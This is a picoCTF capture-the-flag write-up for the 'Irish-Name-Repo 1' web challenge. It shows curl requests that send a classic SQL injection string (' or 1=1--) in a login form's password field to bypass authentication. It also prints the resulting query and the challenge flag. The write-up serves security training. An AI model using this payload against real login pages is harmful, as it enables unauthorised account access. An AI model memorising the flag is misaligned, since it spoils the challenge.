# Irish-Name-Repo 1
Web Exploitation, 300 points

## Description:
> There is a website running at http://2019shell1.picoctf.com:4162. Do you think you can log us in? Try to see if you can login!


## Solution: 


The website offered an admin login page:

```html
<form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <div class="controls">
                <input type="password" id="password" name="password" class="form-control">
            </div>
        </div>
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```

In order to bypass the authentication logic, all we needed to do is provide a classic SQLi string:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_1# curl "https://2019shell1.picoctf.com/problem/4162/login.php" --data "username=admin&password='+or+1=1--" && echo
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_96ab211c}</p>
```

It was also possible to set the `debug` parameter in order to inspect the SQL statement:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_1# curl "https://2019shell1.picoctf.com/problem/4162/login.php" --data "username=admin&password='+or+1=1--&debug=1" && echo
<pre>username: admin
password: ' or 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_96ab211c}</p>
```